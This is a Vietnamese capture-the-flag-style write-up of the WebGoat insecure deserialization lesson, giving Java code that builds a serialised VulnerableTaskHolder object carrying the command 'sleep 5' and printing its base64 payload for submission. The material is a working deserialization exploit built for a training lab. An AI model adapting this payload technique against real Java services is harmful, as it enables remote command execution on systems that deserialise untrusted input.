# (A8) Insecure Deserialization

## Insecure Deserialization

### 5. Let’s try

Đầu tiên là chuẩn bị lại phần code `VulnerableTaskHolder.java` dựa theo bài 3:

```java
package org.dummy.insecure.framework;

import java.io.*;
import java.time.LocalDateTime;

public class VulnerableTaskHolder implements Serializable {
	private static final long serialVersionUID = 2;

	private String taskName;
	private String taskAction;
	private LocalDateTime requestedExecutionTime;

	public VulnerableTaskHolder(String taskName, String taskAction) {
		super();
		this.taskName = taskName;
		this.taskAction = taskAction;
		this.requestedExecutionTime = LocalDateTime.now();
	}
}
```

Lưu ý phần `serialVersionUID = 2` là được mình lấy từ trong source của WebGoat [VulnerableTaskHolder.java](https://github.com/WebGoat/WebGoat/blob/develop/webgoat-lessons/insecure-deserialization/src/main/java/org/dummy/insecure/framework/VulnerableTaskHolder.java). Phần `serialVersionUID` phải khớp với server thì lúc deserialize mới được.

Tiếp theo là file `BuildExploit.java`:

```java
import org.dummy.insecure.framework.*;

import java.io.*;
import java.util.Base64;

public class BuildExploit {
    public static void main(String args[]) throws Exception{
        VulnerableTaskHolder vulnObj = new VulnerableTaskHolder("bruh", "sleep 5");
        
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(vulnObj);
        oos.close();
        
        System.out.println(Base64.getEncoder().encodeToString(bos.toByteArray()));
    }
}
```

Lưu ý rằng ở phần code của cả 2 file phải có dòng `package org.dummy.insecure.framework` và `import org.dummy.insecure.framework.*` thì `serialVersionUID` mới được sử dụng và exploit được.

Để compile được `BuildExploit.java` thì mình setup 2 file như sau: 

```console
$ tree
.
├── BuildExploit.java
└── org
    └── dummy
        └── insecure
            └── framework
                └── VulnerableTaskHolder.java

4 directories, 2 files
```

And then we build and run `BuildExploit.java` hehe:

```console
$ javac BuildExploit.java
$ java BuildExploit
rO0ABXNyADFvcmcuZHVtbXkuaW5zZWN1cmUuZnJhbWV3b3JrLlZ1bG5lcmFibGVUYXNrSG9sZGVyAAAAAAAAAAICAANMABZyZXF1ZXN0ZWRFeGVjdXRpb25UaW1ldAAZTGphdmEvdGltZS9Mb2NhbERhdGVUaW1lO0wACnRhc2tBY3Rpb250ABJMamF2YS9sYW5nL1N0cmluZztMAAh0YXNrTmFtZXEAfgACeHBzcgANamF2YS50aW1lLlNlcpVdhLobIkiyDAAAeHB3DgUAAAflDB4ACjUd9oL0eHQAB3NsZWVwIDV0AARicnVo
```

Submit đoạn base64 trên là xong xD.